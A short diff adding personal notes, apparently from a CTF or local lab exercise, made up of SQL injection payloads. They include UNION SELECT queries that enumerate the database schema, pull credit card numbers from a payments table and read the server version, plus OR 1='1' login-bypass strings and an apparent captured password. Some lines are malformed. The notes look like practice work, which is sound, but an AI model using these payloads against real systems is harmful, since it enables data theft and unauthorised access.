@@ -135,15 +135,19 @@ Abuse The Client (Enum)
 
 
 
+ctf 
+http://127.0.0.1:10090/cases/productsCategory.php?category=13%20UNION%20SELECT%20table_schema,%20table_name,%20column_name%20from%20information_schema.columns
+Boss	R1x9TEeAJsxYwZsIUB3x
+Products=1 UNION SELECT 1,2,@@VERSION
+
+127.0.0.1:10090/cases/productsCategory.php?category=1 UNION SELECT id,creditcard_number, from sqlinjection.payments
+union select creditcard_number,date,order from sqlinjection.payments
+
+NSERT INTO members (first_name, last_name, username, password, email, permission)
+VALUES ('Hacker', 'Hacker', ''OR 1='1', '''OR 1=''1', 'Hacker@gmail.com', 3) 
 
 
-
-
-
-
-
-
-
+1 or 1=1; # 
 
 
 
